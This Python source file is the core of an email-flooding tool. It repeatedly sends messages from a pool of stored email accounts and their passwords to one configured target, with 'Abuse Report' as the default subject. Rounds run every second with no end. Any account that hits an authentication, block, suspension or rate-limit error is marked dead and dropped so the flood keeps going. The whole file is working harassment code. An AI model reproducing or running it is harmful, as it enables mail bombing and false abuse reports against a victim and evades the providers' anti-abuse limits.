# flood_engine.py
import asyncio
from email_sender import send_email
from database import (
    get_active_accounts, mark_account_dead,
    increment_sent, increment_failed, log_stat,
    get_setting
)
from config import TARGET_EMAIL


class FloodEngine:
    def __init__(self):
        self.running = False
        self.sent_total = 0
        self.failed_total = 0

    async def start(self):
        self.running = True
        self.sent_total = 0
        self.failed_total = 0

        target_email = get_setting("target_email", TARGET_EMAIL)
        subject = get_setting("subject", "Abuse Report")
        body = get_setting("body", "I want to report abuse.")
        link = get_setting("link", "")
        attachment_path = get_setting("attachment", "")

        print(f"Starting flood to: {target_email}")

        while self.running:
            accounts = get_active_accounts()

            if not accounts:
                print("No active accounts.")
                self.running = False
                break

            tasks = []
            for acc in accounts:
                acc_id, email, password = acc
                tasks.append(self._send_one(
                    email, password,
                    target_email, subject, body, link, attachment_path
                ))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, result in enumerate(results):
                email = accounts[i][1]
                if isinstance(result, Exception):
                    increment_failed(email)
                    self.failed_total += 1
                else:
                    success, msg = result
                    if success:
                        increment_sent(email)
                        log_stat(email, target_email, "sent")
                        self.sent_total += 1
                    else:
                        increment_failed(email)
                        log_stat(email, target_email, "failed")
                        self.failed_total += 1

                        if any(kw in msg.lower() for kw in ['auth', 'password', 'blocked', 'suspended', 'limit']):
                            mark_account_dead(email)
                            print(f"Dead account: {email}")

            print(f"Round: sent={self.sent_total} failed={self.failed_total}")
            await asyncio.sleep(1)

        print("Flood stopped.")

    async def _send_one(self, email, password,
                        target, subject, body, link, attachment):
        try:
            return await asyncio.wait_for(
                send_email(email, password, target, subject, body, link, attachment),
                timeout=15
            )
        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            return False, str(e)[:100]

    def stop(self):
        self.running = False


flood = FloodEngine()
